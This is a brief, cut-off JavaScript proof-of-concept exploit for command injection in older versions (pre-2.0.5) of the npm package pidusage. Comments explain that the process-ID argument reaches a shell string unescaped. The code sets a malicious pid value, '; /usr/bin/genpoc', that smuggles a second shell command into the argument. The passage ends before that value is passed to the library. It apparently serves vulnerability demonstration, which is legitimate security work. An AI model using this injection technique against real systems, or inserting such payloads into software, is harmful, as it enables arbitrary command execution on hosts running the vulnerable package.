```js
async function exploit() {
   const pidusage = require('pidusage');

   // Older versions of pidusage (pre-2.0.5) interpolate the `pid` argument 
   // directly into a shell execution string without type coercion or escaping.
   // Feeding shell metacharacters here breaks out of the intended parameter boundary.
   const maliciousPid = '; /usr/bin/genpoc';

